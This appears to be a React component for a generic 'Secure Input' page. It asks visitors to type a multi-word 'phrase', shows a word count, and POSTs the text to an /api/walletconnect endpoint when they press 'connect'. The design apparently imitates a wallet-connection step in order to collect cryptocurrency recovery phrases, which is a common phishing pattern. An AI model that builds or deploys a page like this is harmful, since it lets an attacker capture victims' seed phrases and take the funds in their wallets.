'use client';

import React, { useState } from 'react';

const ConnectPassphrase = () => {
  const [value, setValue] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const wordCount = value.trim() ? value.trim().split(/\s+/).length : 0;

  const handleSubmit = async () => {
    setLoading(true);
    setError(null);
    setMessage(null);

    try {
      const res = await fetch('/api/walletconnect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase: value }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.error || 'Something went wrong');
      } else {
        setMessage(data.message);
        setValue('');
      }
    } catch (err) {
      setError('Network error. Try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 flex items-center justify-center px-4">
      
      <div className="w-full max-w-xl bg-white/5 backdrop-blur-lg border border-white/10 rounded-2xl shadow-2xl p-8">
        
        <h1 className="text-2xl font-semibold text-white mb-2">
          Secure Input
        </h1>
        <p className="text-gray-400 text-sm mb-6">
          Enter your phrase below to continue
        </p>

        <textarea
          value={value}
          onChange={(e) => setValue(e.target.value)}
          placeholder="Type your phrase here..."
          className="w-full h-40 p-4 rounded-xl bg-black/40 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none"
        />

        {/* Status messages */}
        {error && (
          <p className="text-red-400 text-sm mt-3">{error}</p>
        )}
        {message && (
          <p className="text-green-400 text-sm mt-3">{message}</p>
        )}

        <div className="flex items-center justify-between mt-4">
          <span className="text-xs text-gray-500">
            Word count: {wordCount}
          </span>

          <button
            onClick={handleSubmit}
            disabled={loading}
            className="px-5 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 transition rounded-lg text-white font-medium"
          >
            {loading ? 'connecting.....' : 'connect'}
          </button>
        </div>

      </div>
    </div>
  );
};

export default ConnectPassphrase;